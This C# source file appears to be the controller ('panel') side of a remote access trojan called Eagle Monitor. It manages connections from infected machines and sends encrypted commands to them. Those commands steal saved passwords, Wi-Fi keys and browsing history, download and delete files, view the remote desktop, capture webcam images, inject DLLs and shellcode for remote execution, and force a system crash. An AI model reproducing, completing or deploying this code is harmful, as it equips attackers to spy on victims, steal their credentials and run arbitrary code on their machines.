using Eagle_Monitor.Forms;
using Microsoft.Win32.SafeHandles;
using Shared;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Clients
{
    public class Client : IDisposable
    {
        public static Dictionary<string, Client>ClientDictionary = new Dictionary<string, Client>();
        public Socket S { get; set; }
        public int Port { get; set; }
        public string IP { get; set; }
        public string HWID { get; set; }
        public string Username { get; set; }
        public ListViewItem ClientLV;
        public PasswordsForm passwordsForm;
        public HistoryForm historyForm;
        public WifiForm wifiForm;
        public ProcessManagerForm processManagerForm;
        public FileManagerForm fileManagerForm;
        public RemoteDesktopForm remoteDesktopForm;
        public ExecuteForm executeDllForm;
        public MiscellaneousForm miscellaneousForm;
        public WebCamForm webCamForm;
        public InformationForm informationForm;
        //public IPAPI.IP CountryInfo;
        public string Country;
    
        public Client(Socket Client)
        {
            this.S = Client;
            this.IP = S.RemoteEndPoint.ToString();
            //Task.Run(() => ReadData());
           new Thread(() => ReadData()).Start();
        }

        private void ReadData()
        {
            try
            {
                while (S.Connected)
                {
                    byte[] dataReceived = Encryption.RSMTool.RSMDecrypt(ReceiveData(), Encoding.Unicode.GetBytes(Utilities.RSMKey));

                    if (dataReceived.Length > 0)
                    {

                        Data data = Shared.Serializer.Deserialize(dataReceived);

                        switch (data.Type)
                        {
                            case PacketType.ID:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetClient).Invoke(this, data, dataReceived.Length));// DataUtilities.SetClient(this, data, dataReceived.Length));
                                break;
                            case PacketType.PASSWORDS:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetPasswords).Invoke(this, data, dataReceived.Length));
                                //new Thread(() => new DataUtilities.SetData(DataUtilities.SetPasswords).Invoke(this, data, dataReceived.Length)).Start();
                                break;
                            case PacketType.HISTORY:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetHistory).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.WIFI:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetWifiPasswords).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.GET_PROC:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetProcess).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.KILL_PROC:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetKilledProc).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.SUSPEND_PROC:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetSuspendedProc).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.RESUME_PROC:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetResumedProc).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.SET_WND_TEXT:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetTextWindowProc).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.GET_D:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetDisks).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.GET_F:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetFilesAndDirs).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.DELETE_F:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetDeleteFile).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.DOWNLOAD_F:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetDownloadFile).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.REMOTE_VIEW:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetRemoteViewer).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.EXEC_MANAGED_DLL:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetManagedExecution).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.EXEC_SHELL_CODE:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShellCodeExecution).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.GET_CAMERAS:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetWebCams).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.CAPTURE_CAMERA:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetCapturedWebCam).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.SHORTCUT_DESKTOP:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShortCutDir).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.SHORTCUT_DOCUMENTS:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShortCutDir).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.SHORTCUT_DOWNLOADS:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetShortCutDir).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.GET_PRIV:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetPrivilege).Invoke(this, data, dataReceived.Length));
                                break;
                            case PacketType.GET_INFORMATION:
                                Task.Run(() => new DataUtilities.SetData(DataUtilities.SetComputerInformation).Invoke(this, data, dataReceived.Length));
                                break;
                        }
                    }
                } 
            }
            catch {}

            try
            {
                if (ClientLV != null)
                {
                    Task.Run(() =>
                    {

                        Utilities.CloseForm(remoteDesktopForm);
                        Utilities.CloseForm(passwordsForm);
                        Utilities.CloseForm(wifiForm);
                        Utilities.CloseForm(fileManagerForm);
                        Utilities.CloseForm(executeDllForm);
                        Utilities.CloseForm(processManagerForm);
                        Utilities.CloseForm(historyForm);
                        Utilities.CloseForm(miscellaneousForm);
                        Utilities.CloseForm(webCamForm);
                        StartForm.M.clientsListView.Items.Remove(ClientLV);
                        ClientDictionary.Remove(this.HWID);
                    });
                } 
            }
            catch { }
            this.Dispose();
            Shared.Utils.ClearMem();
            /*  StartForm.M.Invoke((MethodInvoker)(() =>
              {
                  try
                  {
                      Utilities.CloseForm(remoteDesktopForm);
                      Utilities.CloseForm(passwordsForm);
                      Utilities.CloseForm(wifiForm);
                      Utilities.CloseForm(fileManagerForm);
                      Utilities.CloseForm(executeDllForm);
                      Utilities.CloseForm(processManagerForm);
                      Utilities.CloseForm(historyForm);
                      Utilities.CloseForm(miscellaneousForm);
                      Utilities.CloseForm(webCamForm);
                      StartForm.M.clientsListView.Items.Remove(ClientLV);
                      ClientDictionary.Remove(this.HWID);                     
                  }
                  catch { }

              }));*/
        }

        public static void ClientFixer(Client C)
        {
            if (C.ClientLV != null)
            {
                StartForm.M.Invoke((MethodInvoker)(() =>
                {
                    try
                    {
                        Utilities.CloseForm(C.remoteDesktopForm);
                        Utilities.CloseForm(C.passwordsForm);
                        Utilities.CloseForm(C.wifiForm);
                        Utilities.CloseForm(C.fileManagerForm);
                        Utilities.CloseForm(C.executeDllForm);
                        Utilities.CloseForm(C.processManagerForm);
                        Utilities.CloseForm(C.historyForm);
                        Utilities.CloseForm(C.miscellaneousForm);
                        StartForm.M.clientsListView.Items.Remove(C.ClientLV);
                        ClientDictionary.Remove(C.HWID);
                    }
                    catch { }

                }));
            }
        }
        public static void SimplePacketSender(PacketType packet, Client C) 
        {
            Data D = new Data();
            D.Type = PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { packet };
            Task.Run(() => C.SendData(D.Serialize()));
        }
        public static void TasksLauncher(Client C, ListView L)
        {
            StartForm.M.Invoke((MethodInvoker)(() =>
            {
                foreach (ListViewItem I in L.Items) 
                {
                    if (I.Name == "PassRecovery")
                    {
                        try
                        {
                            C.passwordsForm.Text = "Passwords Recovery: " + C.IP; C.passwordsForm.Show();
                        }
                        catch (Exception)
                        {
                            C.passwordsForm = new PasswordsForm(C.HWID, C.IP); C.passwordsForm.Text = "Passwords Recovery: " + C.HWID; C.passwordsForm.Show();
                        }
                        finally
                        {
                            C.passwordsForm.loadingCircle1.Visible = true;
                            C.passwordsForm.loadingCircle1.Active = true;
                            C.passwordsForm.passwordsListView.Items.Clear();
                            Data D = new Data();
                            D.Type = PacketType.PLUGIN;
                            D.Plugin = Plugins.Recovery;
                            D.IP_Origin = C.IP;
                            D.HWID = C.HWID;
                            D.DataReturn = new object[] { PacketType.PASSWORDS };
                            Task.Run(() => C.SendData(D.Serialize()));
                        }
                    }

                    if (I.Name == "WifiRecovery")
                    {
                        try
                        {
                            C.wifiForm.Text = "Wifi Passwords Recovery: " + C.HWID; C.wifiForm.Show();
                        }
                        catch (Exception)
                        {
                            C.wifiForm = new WifiForm(C.HWID, C.IP); C.wifiForm.Text = "Wifi Passwords Recovery: " + C.HWID; C.wifiForm.Show();
                        }
                        finally
                        {
                            C.wifiForm.loadingCircle1.Visible = true;
                            C.wifiForm.loadingCircle1.Active = true;
                            C.wifiForm.wifiPasswordsListView.Items.Clear();
                            Data D = new Data();
                            D.Type = PacketType.PLUGIN;
                            D.Plugin = Plugins.Recovery;
                            D.IP_Origin = C.IP;
                            D.HWID = C.HWID;
                            D.DataReturn = new object[] { PacketType.WIFI };
                            Task.Run(() => C.SendData(D.Serialize()));
                        }
                    }

                    if (I.Name.Contains("Managed")) 
                    {
                        string[] s = Microsoft.VisualBasic.Strings.Split(I.SubItems[1].Text, "||");
                        byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(s[0]), 1);        
                        Data D = new Data();
                        D.Type = PacketType.PLUGIN;
                        D.Plugin = Plugins.Execute;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { PacketType.EXEC_MANAGED_DLL, b, s[1], Utilities.SplitPath(s[0]) };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }

                    if (I.Name.Contains("Unmanaged")) 
                    {
                        byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(I.SubItems[1].Text), 1);
                        Data D = new Data();
                        D.Type = PacketType.PLUGIN;
                        D.Plugin = Plugins.Execute;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(I.SubItems[1].Text) };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }

                    if (I.Name == "BSOD")
                    {                   
                        Data D = new Data();
                        D.Type = PacketType.PLUGIN;
                        D.Plugin = Plugins.Miscellaneous;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { PacketType.BSOD_SYS };
                        Task.Run(() => C.SendData(D.Serialize()));
                        Client.ClientFixer(C);
                    }
                }
                
            }));
            Shared.Utils.ClearMem();
        }
        public int SendData(byte[] data)
        {
            byte[] encryptedData = Encryption.RSMTool.RSMEncrypt(data, Encoding.Unicode.GetBytes(Utilities.RSMKey));
            lock (S)
            {
                int total = 0;
                int size = encryptedData.Length;
                int datalft = size;
                byte[] datasize = new byte[4];
                S.Poll(-1, SelectMode.SelectWrite);
                datasize = BitConverter.GetBytes(size);
                int sent = S.Send(datasize);
                while (total < size)
                {
                    sent = S.Send(encryptedData, total, size, SocketFlags.None);
                    total += sent;
                    datalft -= sent;
                }
                return total;
            }
        }
        private byte[] ReceiveData()//Socket S)
        {
            int total = 0;
            int recv;
            byte[] datasize = new byte[4];
            S.Poll(-1, SelectMode.SelectRead);
            recv = S.Receive(datasize, 0, 4, 0);
            int size = BitConverter.ToInt32(datasize, 0);
            int dataleft = size;
            byte[] data = new byte[size];
            while (total < size)
            {

                recv = S.Receive(data, total, dataleft, 0);
                total += recv;
                dataleft -= recv;
                //StartForm.M.label1.Text = Utilities.Numeric2Bytes(recv);
            }
            return data;
        }
        public void CloseClient()
        {
            this.S.Shutdown(System.Net.Sockets.SocketShutdown.Both);
            this.S.Close();
            this.S.Dispose();
            this.Dispose();
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {          
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
